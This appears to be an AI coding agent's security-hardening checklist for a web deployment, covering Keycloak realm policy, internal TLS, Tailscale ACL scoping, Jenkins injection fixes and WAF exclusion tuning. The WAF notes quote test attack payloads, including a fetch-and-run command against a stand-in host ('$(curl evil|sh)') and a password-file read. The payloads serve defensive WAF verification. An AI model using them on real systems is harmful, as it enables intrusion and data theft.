- [x] T6.3.2 [deploy]: Enable `etcd.tls.verify` in `common/apisix_conf/config.yaml:48` — client certs already ship (depends on T6.3.1) (2026-07-31; `verify: false → true`. Lower risk than T6.3.1/T6.3.3 — etcd already spoke TLS (`https://etcd:2379`), already had `cert`/`key`/`ca_cert` configured via `docker-compose.yml`'s `ETCD_CERT_FILE`/`ETCD_KEY_FILE`/`ETCD_TRUSTED_CA_FILE`; `verify` was the only thing off. `yamllint`/parse valid.)
- [x] T6.3.3 [deploy]: Move the CrowdSec LAPI channel to https and enable `ssl_verify` (`config.yaml:67,72`) — the bouncer key currently traverses the Docker network in plaintext (2026-07-31; `crowdsec_lapi_scheme: https` + `ssl_verify: true` in `config.yaml`, reusing the `lua_ssl_trusted_certificate` added for T6.3.1. CrowdSec's LAPI itself had no TLS configured (own service, deployed via manual scp per its README, not part of `common/docker-compose.yml`) — added `common/scripts/certs/generate-certs-crowdsec.sh` (mirrors `generate-certs-keycloak.sh`, CN/SAN=`crowdsec`, signed by the same internal CA) and `other/services/crowdsec/config.yaml.local` (CrowdSec's own override-merge mechanism, confirmed via docs) setting `api.server.tls.cert_file/key_file`; `docker-compose.yml` bind-mounts `./tls/` + `./config.yaml.local` (`.gitignore`d tls dir). README "TLS Setup" section + renumbered prod checklist document the manual cert-generate+copy+restart step on the actual CrowdSec host — not executable from this session (remote host, no SSH access here).)
- [x] T6.3.4 [deploy]: Set `sslmode=require` on OpenBao's database secrets engine connection (`common/openbao/bootstrap.sh:252`) — **RESOLVED AS ACCEPTED RISK, 2026-08-04** (was: BLOCKED, not attempted 2026-07-31 — Postgres has no TLS configured anywhere, so flipping this alone would just break OpenBao's DB connection; fixing it properly means standing up full Postgres server-side TLS, affecting every DB client). Full record in `security/SECURITY_REVIEW_2026-07-02.md` under M5. Decision basis, verified against deploy `aa553a9` rather than assumed: (1) cleartext DB traffic exists only on the `haisir-net` docker bridge — prod's `5432` is also published on the Tailscale IP (set in the untracked host-side `prod/.env`, **not** `prod/.env.config.sh`; the compose comment claiming otherwise was wrong and is now corrected), but tailnet traffic is WireGuard-encrypted; (2) a neighbouring container cannot read that bridge traffic — a Linux bridge is a switch so unicast frames never reach a third veth, and both promiscuous capture and ARP-spoof MITM need `CAP_NET_RAW`, which nothing has: all twelve services on `haisir-net` set `cap_drop: ALL` and the five `vault-agent-*` re-add only `IPC_LOCK`; (3) root-on-host can read it but can already `docker exec` into `db` or read `/secrets/postgres_password`, so TLS is no delta there; (4) the literal fix (`sslmode=require`) does not verify the server cert, so it defends only against passive sniffing, which is already impossible — only `verify-full` with CA distribution to all four client types would change the threat model, and that is the full-TLS project this task was correctly scoped away from. Acceptance is load-bearing on the capability drops, so `common/scripts/tests/dev-isolation-check.sh` (already CI-wired) now fails the build on any `NET_RAW`/`NET_ADMIN` grant outside `dev/` — verified to fire against an injected violation, not merely to pass. Re-open triggers recorded in the security-review record. Related fix in the same commit: prod's `5432` was listening on the tailnet IP with **no** ACL rule granting it — a regression, not a posture. Direct operator `psql` over the tailnet is the established workflow (not an SSH tunnel); it broke silently when T7.3.1 narrowed the dev tags off `dst: ["*:*"]` on 2026-07-31 without enumerating `5432`. The ACL now grants `tag:prod:5432` to `tag:dev1` alone.
- [x] **G6.3: internal channels verify TLS** — integration test (2026-08-04; T6.3.1–T6.3.3 fixed the three live `verify: false` channels, T6.3.4 resolved as a documented accepted risk with a CI-enforced invariant rather than left open. Deploy commit `602d155`.)

### G6.4 [deploy]: Keycloak realm hardening
- [x] T6.4.1 [deploy]: Add `passwordPolicy` to `common/keycloak/01-realm.json` — e.g. `length(12) and notUsername and notEmail and passwordHistory(3)` (H3) (2026-07-30; added `"passwordPolicy": "length(12) and notUsername and notEmail and passwordHistory(3)"` — min 12 chars, can't contain username/email, can't reuse last 3 passwords. Scoped strictly to this task: `sslRequired` (T6.4.2) and explicit brute-force params (T6.4.3) untouched. `jq` valid. Applies going forward via `setup-keycloak.sh`'s realm load — does not retroactively invalidate existing passwords. Needs `keycloak_setup: true` in the release manifest.)
- [x] T6.4.2 [deploy]: Set `sslRequired: "external"` (currently `"none"` at `:10`) (depends on T6.4.1) (2026-07-30; `"none"` → `"external"` in `common/keycloak/01-realm.json`. Requires TLS for any non-private-network request Keycloak sees; internal Docker-network traffic is exempt. `jq` valid.)
- [x] T6.4.3 [deploy]: Make brute-force parameters explicit — `failureFactor`, `permanentLockout`, `maxDeltaTimeSeconds` — rather than relying on defaults (depends on T6.4.1) (2026-07-30; added `failureFactor: 30`, `maxDeltaTimeSeconds: 43200`, `permanentLockout: false` to `common/keycloak/01-realm.json` — Keycloak's own stock defaults, now explicit and reviewable rather than implicit. `permanentLockout` deliberately kept `false`: no documented admin-unlock runbook exists in this repo, and a permanent lockout on the sole `admin` account would be a self-inflicted outage. Left at defaults rather than tightened — the task asked for explicitness, not a lockout-policy change; tightening is a separate product/support-load tradeoff. `jq` valid.)
- [x] T6.4.4 [deploy]: Evaluate requiring OTP/WebAuthn for `admin` and `institution_admin` (depends on T6.4.1) (2026-07-30; **evaluated, deferred — no realm change.** `institution_admin` is explicitly out of target-state scope (`02_auth_and_roles.md` scopes this increment to student/parent/admin only; `decisions.md` 2026-07-27 records an explicit hold on `institution_admin` target-state work), so MFA for a role with no live users is moot. For `admin`: Keycloak has no per-role "require OTP" realm-JSON field — it needs a per-user `CONFIGURE_TOTP` required action or a custom Conditional-OTP flow keyed on role, which changes the live `admin` account's login experience; not appropriate to change unilaterally as a side effect of T6.4.1–T6.4.3. Decision recorded in `decisions.md` (2026-07-30, "T6.4.4"): build the conditional-OTP flow once for both roles together when `institution_admin`'s hold lifts; interim compensating controls are `bruteForceProtected` + the new `passwordPolicy` from T6.4.1.)
- [x] **G6.4: H3 — realm password and TLS policy enforced** — integration test (2026-07-30; T6.4.1–T6.4.4 all done. `jq '.' common/keycloak/01-realm.json` passes; `passwordPolicy`, `sslRequired: external`, and explicit brute-force params (`failureFactor`/`maxDeltaTimeSeconds`/`permanentLockout`) all present. T6.4.4's MFA evaluation deliberately concluded "defer" rather than "implement" — recorded as a decision, not left undone.)

- [x] **G6: Auth and transport verification** — integration test (2026-08-04; G6.1–G6.4 all closed — Keycloak channels verify TLS, JWT audience enforced, internal channels verify TLS with the Postgres-TLS gap resolved as a CI-guarded accepted risk, and the realm carries a password policy + `sslRequired: external` + explicit brute-force params)

## G7 [deploy, backend, frontend]: Residual review items

### G7.1 [backend]: Request size and upload validation
- [x] T7.1.1 [backend]: Replace `Content-Length` arithmetic in `src/auth/request_middleware.py:151,169,194` with a streaming byte cap in a pure-ASGI `receive` wrapper; treat a body-bearing request with no `Content-Length` as requiring the streaming path (M2) (2026-07-30)
- [x] T7.1.2 [backend]: Delete `_validate_file_uploads` (`request_middleware.py:189`), `_extract_filename` (`:230`) and `_is_allowed_file_type` (`:240`) — spanning roughly `:189-250`, plus the `self._validate_file_uploads(request)` call site at `:184`. They read a request-level `Content-Disposition` that never exists for multipart, so they have never rejected anything (B2). The originally-scoped range `208-228` was wrong at scoping time — it points at the `Content-Disposition` block *inside* the first function, not the three definitions (depends on T7.1.1) (2026-07-30)
- [x] T7.1.3 [backend]: Chunk-read extraction uploads and abort past the cap in `admin_extraction.py:175-181` and `parent_extraction.py:182-188`, currently fully spooled before the 50 MB check; shared helper next to `sniff_mime` (B4) (2026-07-30)
- [x] T7.1.4 [backend]: Malformed `Content-Length` returns 400, not an unhandled 500 (B3) (depends on T7.1.1) (2026-07-31)
- [x] **G7.1: size limits hold under chunked encoding** — integration test (2026-08-01; added `test_real_chunked_transfer_encoding_over_cap_returns_413` to `tests/unit/auth/test_middleware.py` — a genuine HTTP/1.1 request with `Transfer-Encoding: chunked` (no `Content-Length` on the wire) sent over a real socket to a live uvicorn instance, asserting 413 from the streaming byte-cap path. The existing `test_streamed_payload_over_cap_returns_413` only drove the ASGI `receive` callable directly, not an actual chunked-encoded request, so this closes the gap the gate asked for. Verified the new test fails (200 instead of 413) when the byte-cap check is neutered, confirming it actually exercises the enforcement path rather than passing vacuously; 69/69 tests in the file pass with the fix restored. Change made in the `backend` VS Code devcontainer (`/workspaces/haisir-backend`, separate checkout from the host clone) per the user's instruction — uncommitted as of this note, not yet pushed.)

### G7.2 [deploy, backend]: Jenkins parameter injection
- [x] T7.2.1 [backend]: Validate `params.TAG` against `^[A-Za-z0-9._-]+$` and pass via `withEnv` + single-quoted `sh` in `haisir-backend/Jenkinsfile:197,209,305,340` — currently untouched since the review (M3) (2026-07-29)
- [x] T7.2.2 [deploy]: Validate `params.VERSION` against `^\d+\.\d+(\.\d+)?$` in `Jenkinsfile.deploy:58,89-107`; the remote-exec path is already correct, `MANIFEST_PATH` is not (depends on T7.2.1) (2026-07-29)
- [x] T7.2.3 [deploy]: Restrict who can trigger parameterised builds (depends on T7.2.2) (2026-07-29)
- [x] **G7.2: M3 — build params cannot inject shell** — integration test (2026-07-29; verified `VERSION`/`TAG` regex gates in both Jenkinsfiles plus `withEnv`-only shell interpolation, and `matrix-auth` plugin + documented Access Control restriction in `other/services/jenkins/README.md`)

### G7.3 [deploy]: Tailscale least privilege
- [x] T7.3.1 [deploy]: Replace `dst: ["*:*"]` for `tag:dev1`/`tag:in-dev1`/`tag:in-dev2` in `other/services/tailscale/tailscale.json:28-35` with the specific services and ports actually needed (M4) (2026-07-31; replaced the wildcard rule with per-tag scoped `dst`: `tag:staging:22,81,443,3080,9180` (NPM admin UI + proxied internal UIs, Dockhand, APISIX admin — 9180 added at user's explicit request), `tag:ci:22,81,443,3080` (NPM + Dockhand), `tag:prod:22,3080,9180` (Dockhand, APISIX admin — prod has no NPM, uses Cloudflare Tunnel instead), `tag:compute:22,53,443,11434,8081` (mirrors the existing staging/prod→compute grant). Traced against real service bindings, not guessed: NPM (`other/services/npm`) and Dockhand (`other/services/dockhand`) both bind `${TAILSCALE_IP}:<port>` directly; APISIX/Keycloak/Postgres/OpenBao admin ports stay off this list — they bind `127.0.0.1` only in `docker-compose.yml`/`docker-compose.openbao.yml`, unreachable over Tailscale regardless of ACL, by design (SSH tunnel is the intended path), except APISIX admin's `9180` which the user asked to add explicitly (implies a `APISIX_ADMIN_PORT_BINDING` override to the Tailscale interface when needed). **`22` is required even though this src/dst pair is also covered by the `ssh` ACL block below** — Tailscale's `ssh` section only grants permission to use the SSH feature, it does not itself open the underlying network path; that's still governed by `acls`, so the first version of this change (without `22`) locked the user out of `ssh staging`/`ssh prod` until `22` was added back and the policy re-applied in the Tailscale Admin Console — confirmed live: SSH restored, other scoped ports also confirmed working. `jq` valid. **Repo-only change — must be pasted into the Tailscale Admin Console per the README's "Apply ACLs" step to take effect; not part of any automated deploy flow.** (Applied and verified live 2026-07-31.))
- [x] T7.3.2 [deploy]: Gate prod SSH behind a separate rarely-held tag; consider Tailscale SSH check mode and session recording (`:72-84`) (depends on T7.3.1) (2026-07-31; **final shipped design:** new tag `tag:prod-ssh` in `tagOwners` (`autogroup:admin`-only); `ssh` block: `tag:dev1` → `staging`/`ci`/`compute` only (no prod); separate rule `src: ["tag:prod-ssh"]` → `dst: ["tag:prod"]`, `"action": "accept"`. `acls` (network layer) split so only `tag:dev1` reaches `tag:prod` at all — `tag:in-dev1`/`tag:in-dev2` have zero network path to prod (SSH or otherwise), a deliberate widening beyond the ticket's literal ask per the user's explicit instruction ("only dev1 should be allowed the ssh access, remove ssh access for in-dev1 and in-dev2", "cut off entirely" over keeping non-SSH `3080`/`9180`). Operator step: the trusted admin machine advertises **both** `tag:dev1,tag:prod-ssh` — the rare tag is additive, not a replacement. `tag:ci`→`staging`/`prod` (automated Jenkins path, T7.2.3) untouched. **Session recording evaluated, deliberately deferred** — needs a `tsrecorder` node, infra this repo doesn't run; documented in the README as a parked decision (T6.3.4/T7.7.2 pattern). `jq` valid. **Two wrong turns on the way here, both corrected same day before/via live testing — worth keeping so the next person doesn't repeat them:** (1) first design gated the `ssh` rule on `tag:prod-ssh` using `"action": "check"` — rejected by the Admin Console outright (`"[ssh] \"check\" action does not support tags in src"`); check mode challenges a *person*, so it structurally cannot key on a device tag. (2) switched to `src: ["autogroup:admin"]` to satisfy check mode's user-identity requirement — this *validated* and even looked more secure on paper, but a live `ssh prod` attempt failed with `"tailnet policy does not permit you to SSH to this node"`. Root cause: once a device advertises **any** tag, Tailscale attributes all its traffic to that tag for policy evaluation and strips the logged-in user's identity from consideration entirely — so `autogroup:admin` can never match a connection from a tagged device like this one (`tag:dev1`), no matter who's logged in. This also meant, before it was caught, that the `autogroup:admin` design had briefly reopened prod to `tag:in-dev1`/`tag:in-dev2` via the still-bundled `acls` rule from T7.3.1, which is what prompted the `acls` split above. **Conclusion: check mode is fundamentally incompatible with any node that carries other tags, which every real dev/prod-ssh machine here does — dropped in favor of a plain tag-gated `accept` rule**, which is what the "separate rarely-held tag" half of this task's ask already called for.)
- [x] **G7.3: M4 — a compromised dev laptop cannot reach prod** — acceptance test (2026-07-31; T7.3.1 (network `acls` narrowed off `*:*`, later re-split per T7.3.2's fixes so only `tag:dev1`/`tag:prod-ssh` reach prod) and T7.3.2 (prod SSH gated behind the separate `tag:prod-ssh` tag, held only by the trusted admin machine alongside `tag:dev1`; `tag:in-dev1`/`tag:in-dev2` have zero network path to `tag:prod`) both done. `jq '.' other/services/tailscale/tailscale.json` passes. A real `ssh prod` attempt against the interim `autogroup:admin`/`check` design failed live (`"tailnet policy does not permit..."`), which is what surfaced the tagged-node incompatibility documented in T7.3.2's note. **Final `tag:prod-ssh` + `accept` design live-confirmed working 2026-07-31** — after re-advertising `--advertise-tags=tag:dev1,tag:prod-ssh` (which forced a fresh Tailscale login, expected on a tag-set change) and re-authenticating, `ssh prod` succeeded from the trusted admin machine. G7.3 acceptance criterion fully met end-to-end, not just on `jq`/policy-syntax validation.)

### G7.4 [deploy]: Header cleanup
- [x] T7.4.1 [deploy]: Set `X-XSS-Protection: 0` across all four plugin configs (L3, BR-CSP-006) (2026-07-31; `"1; mode=block"` → `"0"` in all four `response-rewrite` blocks. `jq` valid.)
- [ ] T7.4.2 [deploy]: Add the gateway backstop CSP (`frame-ancestors`, `base-uri`, `object-src`, `form-action`) scoped to non-HTML routes only, so it never collides with `proxy.ts`'s policy per BR-CSP-004 (depends on T5.4.1 [frontend])
- [ ] **G7.4: header ownership matches the spec table** — integration test

### G7.5 [deploy, specs]: Documented acceptances
- [x] T7.5.1 [specs]: Record L5 (`referer-restriction bypass_missing: true`, 7 files) as a deliberate spam filter, not a security boundary — no code change (2026-07-31; re-verified the 7 files still carry `bypass_missing: true` — `01-secured-authenticated.json`, `02-secured-anonymous.json`, `03-secured-api.json`, `04-secured-api-upload.json`, `01-keycloak-realms.json`, `13-keycloak-admin.json`, `14-keycloak-master-realm.json` — before recording it. Updated `security/SECURITY_REVIEW_2026-07-02.md`'s L5 section and summary-table row to state this as the accepted-risk record, no fix intended: the real boundary on every sensitive route is CSRF + OIDC + IP allowlists, not `referer-restriction`. No `haisir-deploy` change.)
- [x] T7.5.2 [specs]: Reframe M6 and L4 as dev-isolation assertions rather than findings — prod is correctly hardened (etcd client-cert auth, no published ports, Keycloak `start` + `KC_HOSTNAME_STRICT=true`, no pgAdmin); the risk is regression, not current state (2026-07-31; re-verified directly against current `common/docker-compose.yml`/`dev/docker-compose.yml` — line numbers had drifted since the 2026-07-27 review from Phase 7's own OpenBao-agent additions, re-checked rather than copied forward: `ETCD_CLIENT_CERT_AUTH=true`/`read_only`/no published port (prod etcd) vs. unpublished `ALLOW_NONE_AUTHENTICATION=yes` (dev etcd); `command: [start]`/`KC_HOSTNAME_STRICT=true`/`KC_HTTP_ENABLED=false` (prod Keycloak) vs. `start-dev`/`KC_HOSTNAME_STRICT=false` (dev); zero pgAdmin references in the prod compose file. Updated `security/SECURITY_REVIEW_2026-07-02.md`'s M6/L4 sections and summary-table rows. The residual regression-guard work (CI assertion these patterns never leak outside `dev/`) is T7.5.3, not this task.)
- [x] T7.5.3 [deploy]: Add a CI assertion that the dev-only patterns (`ALLOW_NONE_AUTHENTICATION`, `start-dev`, published DB/admin ports, `KEYCLOAK_ADMIN_ALLOWED_CIDR=0.0.0.0/0`) never appear outside `dev/` (depends on T7.5.2) (2026-07-31; new `common/scripts/tests/dev-isolation-check.sh` — follows the existing `plaintext-residue-scan.sh` convention (violations array, `grep -q` pattern checks only, never prints env-file values). Checks all `docker-compose*.yml` outside `dev/`/`archived/` for `ALLOW_NONE_AUTHENTICATION`, `start-dev`, and bare (no host-IP) publishes of the known DB/admin ports (5432/5050/8080/8443/9080/9180/2379/2380); checks `common/.env.config.common.sh`/`staging/.env.config.sh`/`prod/.env.config.sh` for `KEYCLOAK_ADMIN_ALLOWED_CIDR` widened to `0.0.0.0/0`. Wired into `Jenkinsfile` as a new parallel `Dev Isolation Check` stage — none of the sibling scan scripts (`plaintext-residue-scan.sh` etc.) were actually pipeline-wired before this, so this is a real CI assertion, not just a runnable script. Verified: `shellcheck` clean, script exits 0/PASS against the current tree, Jenkinsfile brace/paren-balanced.)
- [x] T7.5.4 [deploy]: `chmod 600` staging/dev `.env*` for consistency (L2) — they hold no secrets since Phase 5.6, so this is hygiene (2026-07-31; `dev/.env`, `dev/.env.config.sh`, `dev/.env_info` chmod'd 600 — dev runs locally straight out of this checkout, so these are the live files. staging/prod `.env*` are never synced from this repo (`common/scripts/deploy-lib.sh:207-215` — they live only on the remote, hand-maintained via SSH) so the local `staging/.env`/`staging/.env.config.sh` copies chmod'd here are cosmetic consistency only; the real staging + prod host files were already fixed by the user directly via SSH before this task ran. `prod/.env`/`prod/.env.config.sh` local copies were already 600.)
- [x] **G7.5: accepted risks are documented and regression-guarded** — acceptance test (2026-07-31; T7.5.1–T7.5.4 all done — L5 and M6/L4 documented as accepted risk in `security/SECURITY_REVIEW_2026-07-02.md`, the dev-isolation boundary is now mechanically regression-guarded by a real Jenkins CI stage rather than left as a one-time review finding, and `.env*` perms are consistent. Verified by running the new check script directly (PASS, 0 violations) rather than trusting the Jenkins stage sight-unseen.)

### G7.6 [deploy]: Phase 5.6 parked gaps
- [x] T7.6.1 [deploy]: Fix `common/scripts/setup.sh`'s `APISIX_ADMIN_KEY` pre-check failing under `set -u` on standalone invocation — landed as a side effect of Phase 6.5's deploy work (the required-var check moved to after the OpenBao render hook runs); confirmed on reconciliation, 2026-07-29
- [x] T7.6.2 [deploy]: Reconcile `common/docker-compose.yml`'s hardcoded `haisir-net` against the documented dev network `haisir-net-dev` (2026-07-31; `networks.haisir-net.name` was a bare literal `"haisir-net"`, ignoring `NETWORK_NAME` entirely even though `env-setup.sh` (the script that actually creates this external network) already reads a `NETWORK_NAME` override with this same default. Changed to `${NETWORK_NAME:-haisir-net}`, matching `env-setup.sh`'s own default exactly — zero-risk when unset (resolves to the identical literal as before), takes effect if an env ever sets `NETWORK_NAME`. Did not change `env-setup.sh`'s default or rename any live network — out of scope to avoid a live-host network-recreate; whether staging/prod's `.env.config.sh` currently set `NETWORK_NAME` at all needs operator verification, not something checkable from this session per the `.env*` read restriction.)
- [x] **G7.6: Phase 5.6's parked deploy gaps closed** — integration test (2026-07-31; T7.6.1–T7.6.2 all done — `setup.sh`'s `APISIX_ADMIN_KEY` pre-check ordering fixed, and `haisir-net` now resolves `${NETWORK_NAME:-haisir-net}`, matching `env-setup.sh`'s own default)

### G7.7 [deploy]: New anomalies from the 2026-07-27 audit
- [x] T7.7.1 [deploy]: Narrow APISIX `allow_admin` from the whole Docker subnet (`config.yaml:38`) — any container on `haisir-net` that learns the admin key can rewrite every route (2026-07-31; audited for a legitimate in-container caller of `:9180` first — none found, every admin API call (`setup.sh`, `create_*_config.sh`, cert sync) runs from the host, already covered by the `10.0.2.0/24` entry. Removed the `{{DOCKER_NETWORK_SUBNET}}` entry entirely, no functional loss. `yamllint` valid.)
- [x] T7.7.2 [deploy]: Decide whether `enable_admin_ui: true` (`config.yaml:35`) is warranted; it is a routing-config web UI behind a single static key with no MFA — **DECIDED 2026-08-04: disable it.** `enable_admin_ui: false` in `common/apisix_conf/config.yaml` (staging/prod); `dev/apisix_conf/config.yaml` deliberately keeps `true`, same isolation pattern as L4. `enable_admin_cors` follows it to `false` — admin CORS exists only to serve browser clients of the Admin API and the dashboard was the only one. Full record in `security/SECURITY_REVIEW_2026-07-02.md`. **The finding conflated two things:** the "single static key, no MFA, no audit trail" property belongs to the *Admin API on the same port*, not the UI — `curl -H "X-API-KEY: …"` does everything the dashboard did, so disabling the UI does not close that gap and is not recorded as having done so. What it does close: the dashboard was the only path putting `APISIX_ADMIN_KEY` into a browser (localStorage/devtools/history, reachable by a malicious extension), plus one bundled-JS surface patched on APISIX's release schedule. Classic CSRF never applied — auth is a custom header, not a cookie. Behind three stacked gates (tailnet membership, the tailnet ACL, APISIX `allow_admin`) it was never internet-reachable; the argument for turning it off is that the team works via CLI and does not use it, so it costs nothing. **Followed through on the port too:** `9180` removed from the tailnet ACL for `tag:prod`, so the Admin API is reachable only from the prod host itself (`10.0.2.0/24` + the host's own Tailscale IP) — every automated caller already runs there and Jenkins reaches prod over SSH, so no deploy path regresses. Staging keeps `9180`. Costs direct `curl` to prod's Admin API from the workstation (go via SSH to prod instead), and makes `APISIX_ADMIN_ALLOWED_CIDR` dead config on prod — operator step to unset it in `prod/.env.config.sh`, noted in `config.yaml`. **Prod should also stop binding `9180` to the Tailscale interface** — the ACL is applied by hand in the Tailscale console and can drift, so it is a single point of failure. Audited every Admin API caller before recommending this: all run on the prod host (`deploy.sh` wraps `setup.sh` in `remote_exec`, Jenkins only calls `deploy.sh`, `haisir-sync-certs.sh` is a root certbot hook on prod, `configure-ssl.sh` reads `~/certs` there), all falling back to loopback when `APISIX_ADMIN_PORT_BINDING` is unset. **Trap:** `APISIX_ADMIN_URL` is pinned to the Tailscale IP in `prod/.env.config.sh` and must be unset in the same change, or the certbot renewal hook fails silently months later at renewal time. Full operator steps in the security-review record. Residual (static key, no MFA, no route-change audit) is an accepted risk — APISIX has no native Admin-API MFA, and fronting the gateway's own admin port with an OIDC proxy adds a bootstrap-order dependency in the path of every deploy. Guarded: `dev-isolation-check.sh` now fails the build on `enable_admin_ui: true` outside `dev/`, verified to fire against an injected violation. Also updated the two setup scripts that printed a now-dead `/ui/` URL.
- [x] T7.7.3 [deploy]: Harden `env-setup.sh:139` so a set `TMPDIR` cannot place the rendered secret env file on disk-backed storage instead of `/dev/shm` (2026-07-31; `mktemp "${TMPDIR:-/dev/shm}/..."` → `mktemp "/dev/shm/..."` — TMPDIR can no longer redirect this file. `shellcheck` clean on the changed line.)
- [x] T7.7.4 [deploy]: `chmod 600` the files inside `.templated/` — the 0700 directory is currently the only protection on 0664 files containing resolved secrets (2026-07-31; single `chmod 600 "$output_file"` added at the end of `template-configs.sh`'s `replace_placeholders()` function — one edit point covers all four call sites (plugin_configs/routes/keycloak/apisix_conf), placed after the optional ip-restriction-strip `mv` so it applies to the final file regardless of path. `shellcheck` clean.)
- [x] T7.7.5 [deploy]: Migrate `other/services/sonarqube/.env` (`SONAR_DB_PASSWORD`, mode 0664) out of plaintext, or document the `other/services/*` stacks as explicitly outside the OpenBao boundary (2026-07-31; documented — new `other/services/sonarqube/README.md`, consistent with T7.5.1/T7.5.2's precedent of documenting accepted risk for standalone `other/services/*` stacks rather than pulling them into the OpenBao boundary. Manual step (not done by this tool per the `.env*` hard constraint — permission-only `chmod` isn't on the explicit allow-list either): operator runs `chmod 600 other/services/sonarqube/.env`.)
- [x] **G7.7: audit anomalies closed or documented** — acceptance test (2026-08-04; T7.7.1–T7.7.5 all done — `allow_admin` narrowed, admin dashboard disabled for staging/prod with the static-key residual documented as accepted risk, `TMPDIR` redirection closed, `.templated/` files at 0600, and the `other/services/*` stacks documented as outside the OpenBao boundary. Verified by running `dev-isolation-check.sh` directly (PASS) *and* by injecting violations to confirm the two new checks actually fire. Deploy commit `602d155`.)

- [ ] **G7: Residual review items** — integration test

## G8 [specs]: Review gate and closeout — HARD GATE

### G8.1 [specs]: Independent review passes
- [ ] T8.1.1 [specs]: Adversarial security-review pass 1 against the full diff, following the Phase 5.5/5.6 precedent
- [ ] T8.1.2 [specs]: Adversarial security-review pass 2, independent of pass 1 — 5.6's pass 2 found a live-credential bug pass 1 rated clean (depends on T8.1.1)
- [ ] T8.1.3 [specs]: Fix or explicitly accept every finding from both passes (depends on T8.1.2)
- [ ] **G8.1: two independent passes clean** — acceptance test

### G8.2 [specs]: Runbook
- [ ] T8.2.1 [specs]: Write the vendored proxy-wasm upgrade runbook — how to rebase on upstream, re-apply the APISIX patch, bump the version set, and re-run the G2 gate
- [ ] T8.2.2 [specs]: Document the CRS upgrade cadence and where the LTS track is tracked (depends on T8.2.1)
- [ ] **G8.2: the next upgrade does not require rediscovery** — acceptance test

### G8.3 [specs]: Reconcile specs with reality
- [ ] T8.3.1 [specs]: Update `16_gateway_waf.md` and `15_security_headers.md` status notes to what actually shipped
- [ ] T8.3.2 [specs]: Update `security/SECURITY_REVIEW_2026-07-02.md` annotations to final status (depends on T8.3.1)
- [ ] T8.3.3 [specs]: Append the Phase 7 close-out entry to `decisions.md` and `progress.md` (depends on T8.3.2)
- [ ] **G8.3: specs match the shipped system** — acceptance test

- [ ] **G8: Review gate and closeout** — acceptance test — **HARD GATE: no merge until this passes**

## Ready now

> **Recomputed 2026-08-04 (seventeenth pass).** T4.2.5 [deploy] done — user explicitly overrode the
> "wait for a real environment ≥ v2026.6" reading of BR-WAF-011 (`apisix-dev` already satisfies it
> directly) and drove a full live-browser walkthrough as the real-traffic evidence, same substitution
> T4.1.2 used. All three DetectionOnly soak blocks removed from `03-secured-api.json`; enforcement
> confirmed live, including one payload (`$(xyzq)`) deliberately constructed to isolate the new
> `id:199140` rule's own block action from the surrounding CRS coverage. **G4.2 closes — and with all
> five of G4.1–G4.5 now done, G4 itself closes: "Exclusions rewritten field-scoped or deleted" is met.**
> `03-secured-api.json`'s blanket `ctl:ruleRemoveById` count is down to 2 (both `931130`, both
> structurally unscopeable, both correctly justified).
> **Nothing new unblocks as a direct result** — no task in this file lists G4 as a dependency; G4 was
> the acceptance criterion for its own five children, not a gate for later work. **G8 (review/closeout)
> remains correctly NOT ready** — its `T8.1.1` has no listed dependency but is a whole-diff adversarial
> review, and G5 (CSP)/G6 (auth/transport)/G7 (residual review items) are all still open, so starting
> it now would review a moving target.
> **Ready now [deploy]: none newly unblocked** — only the parked **T6.3.4 / T7.7.2** (scope/product
> decisions, unchanged). **[backend]/[frontend]/[specs]: none.**
> **Deploy baseline bumped to `aa553a9`** — the full `id:199100`→`id:199140` chain of edits across
> T4.2.1/T4.2.4/T4.2.5 landed in one commit, made by the user directly outside this session
> ("fix(waf): refine rule exclusions and enhance field-scoping for topic-content edits"), content
> verified to exactly match what these three tasks built.

> **Recomputed 2026-08-03 (sixteenth pass).** T4.2.4 [deploy] done. The adversarial pass required
> before widening a WAF exclusion **rejected the task as scoped and shipped a better variant** — worth
> reading the task note, because the one-line fix the fifteenth pass prescribed would have been a
> security regression. Two findings drove that: (1) the false positive is far broader than "OCR'd MCQ
> content" — `t:cmdLine` deletes the space before `(`, so *any* inline LaTeX followed by a
> parenthetical trips `932130`; 3 of 7 realistic student messages were blocked. (2) Removing `932130`
> alone let 2 of 9 attack payloads through (`$(curl evil|sh)`, `cat /etc/pass[a-z]d`) because `932220`
> was already excluded here for markdown tables. Shipped instead: the exclusion **plus** a co-scoped
> compensating rule `id:199140` — `932130`'s own regex minus the `cmdLine` normalisation — giving
> **7/7 benign passing and 9/9 attacks blocked**, strictly better than the 4/7 and 9/9 we had.
> **G4.2 remains open, and G4 with it — deliberately.** Its design half is done and verified, but the
> affected URIs are still under `ctl:ruleEngine=DetectionOnly`, so an attack on them returns 200
> today. Closing "endpoints protected" while they demonstrably are not would have been the convenient
> read, not the true one. **Newly opened: T4.2.5 [deploy]** — remove the three soak pairs and restore
> enforcement. It is **not Ready now**: per BR-WAF-011 it needs T4.2.1/T4.2.4's changes deployed and
> observed on a real environment running `GATEWAY_IMAGE_TAG` ≥ `v2026.6` first, and no release
> carrying that image exists yet.
> **Ready now [deploy]: none unblocked** — only the parked **T6.3.4 / T7.7.2** (scope/product
> decisions). **[backend]/[frontend]/[specs]: none.** The critical path now runs through a *release*,
> not a task: cut a release that bumps the gateway image to ≥ `v2026.6` and carries the
> `03-secured-api.json` changes, observe, then T4.2.5 → G4.2 → G4.
> **Deploy baseline still `e337f83`** — T4.2.1's and T4.2.4's edits are both uncommitted in the
> working tree for user review.

> **Recomputed 2026-08-03 (fifteenth pass).** T4.2.2 and T4.2.3 [deploy] both done — both PASS, on
> all endpoints, verified on an isolated enforce-mode `waf-harness.sh` stack rather than closed on
> the fourteenth pass's partial evidence. That evidence turned out to be genuinely incomplete, which
> is why they were re-run rather than rubber-stamped: T4.2.3 had covered 1 of 6 URI+method pairs, and
> T4.2.2's "920390 never fired" was an untested absence rather than a result. Full matrices in each
> task note.
> **G4.2 is NOT closed, and G4 stays open on it.** Its "protected" half is met; its
> "false-positive-free" half is not. T4.2.3's sweep found a real, reproducible cross-route
> inconsistency: identical OCR'd LaTeX + MCQ content passes `PATCH /api/topics-contents/{id}` (where
> `id:199120` excludes `932130`) but 403s on **both** hAITU endpoints (where `id:199110` does not) —
> i.e. a student pasting an exam question into topic-doubt is blocked. Pre-existing, not caused by
> T4.2.1; the rewrite just made it visible. **Newly opened: T4.2.4 [deploy]**, dependency-free and
> **Ready now**, to add `932130` to `id:199110`'s field-scoped list. Deliberately not folded into
> T4.2.3 — widening a WAF exclusion needs the adversarial pass per `feedback_waf_challenger_review`,
> not a drive-by edit inside a verification task.
> Ready now [deploy]: **T4.2.4** (new), plus the parked **T6.3.4 / T7.7.2**.
> **[backend]/[frontend]/[specs]: none.**
